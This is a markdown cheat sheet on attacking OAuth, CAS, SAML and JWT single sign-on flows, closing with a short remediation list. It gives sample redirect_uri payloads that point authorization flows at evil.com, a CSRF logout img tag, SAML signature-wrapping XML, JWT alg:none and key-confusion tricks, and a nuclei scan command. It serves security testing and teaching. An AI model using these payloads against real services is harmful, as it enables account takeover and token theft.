# OAuth / SSO Attack — Complete Guide

## 1. Common Vulnerabilities

### 1.1 redirect_uri Manipulation
```
# Open redirect via redirect_uri
https://target/oauth/authorize?redirect_uri=https://evil.com

# Path traversal
https://target/oauth/authorize?redirect_uri=https://target.com/../../../evil.com

# Subdomain takeover
https://target/oauth/authorize?redirect_uri=https://sub.target.evil.com

# Parameter pollution
https://target/oauth/authorize?redirect_uri=https://target.com/callback&redirect_uri=https://evil.com
```

### 1.2 State Parameter Missing
```
# CSRF via missing state
1. Attacker initiates OAuth flow
2. Gets authorization code
3. Tricks victim into visiting callback URL with attacker's code
4. Victim's account linked to attacker's OAuth identity
```

### 1.3 Token Leakage
```
# Token in URL (referrer header leak)
https://target/callback#access_token=eyJhbG...

# Token in error messages
https://target/callback?error=access_denied&access_token=eyJhbG...
```

### 1.4 Scope Escalation
```
# Request elevated scope
https://target/oauth/authorize?scope=openid+profile+email+admin

# If server accepts elevated scope
→ Attacker gets admin-level access
```

## 2. CAS (Central Authentication Service) Attacks

### 2.1 Service Ticket Reuse
```
1. Intercept CAS service ticket
2. Replay before expiration
3. Gain access to victim's session
```

### 2.2 Open Redirect in Service Parameter
```
https://cas.target.com/login?service=https://evil.com
```

### 2.3 CAS Logout CSRF
```
<img src="https://cas.target.com/logout">
→ Victim logged out without consent
```

## 3. SAML Attacks

### 3.1 Signature Wrapping
```
1. Intercept SAML response
2. Move signed assertion inside unsigned assertion
3. Modify claims in the moved (now unsigned) assertion
4. Server validates the outer signature, reads inner claims
```

### 3.2 XML Signature Attacks
```
# Comment injection
<ds:DigestValue>abc<!--comment-->def</ds:DigestValue>

# Wrapping
Original: <Assertion ID="1"><Subject>admin</Subject></Assertion>
Modified: <Assertion ID="1"><Assertion ID="1"><Subject>user</Subject></Assertion><Subject>admin</Subject></Assertion>
```

## 4. JWT in OAuth

### 4.1 alg:none
```
Change JWT alg to "none", remove signature
→ Server accepts unsigned token
```

### 4.2 Key Confusion
```
RS256 → HS256 with public key as secret
→ Server verifies with public key thinking it's HMAC secret
```

## 5. Tools

### Burp Suite
```
1. OAuth Scanner extension
2. Autorize for authorization testing
3. Repeater for manual testing
```

### nuclei
```bash
nuclei -u http://target -tags oauth,sso,cas,saml
```

## 6. Remediation

1. **Strict redirect_uri validation** — Exact match, no wildcards
2. **Always use state parameter** — Prevent CSRF
3. **Validate token audience** — Token should only work for intended service
4. **Use PKCE** — Proof Key for Code Exchange
5. **Short token lifetime** — Minimize exposure window
6. **HTTPS everywhere** — Prevent token interception
